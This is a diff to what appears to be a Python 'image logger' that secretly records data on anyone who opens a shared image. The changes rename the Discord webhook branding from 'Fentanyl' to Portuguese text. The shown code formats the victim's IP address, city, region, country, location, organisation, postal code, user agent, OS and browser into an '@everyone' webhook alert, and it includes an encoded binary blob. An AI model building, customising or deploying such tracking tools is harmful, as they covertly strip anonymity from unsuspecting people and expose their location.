@@ -10,13 +10,13 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
+  "username": "Herotá-napika",
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "Olha a mensagem",
       "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
+      "description": "Abriram o imagelogger",
       "author": {
         "name": "Fentanyl"
       },
@@ -29,7 +29,7 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
         {
           "name": "Advanced Info",
           "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
-          "inline": False
+          "inline": True
         }
       ]
     }
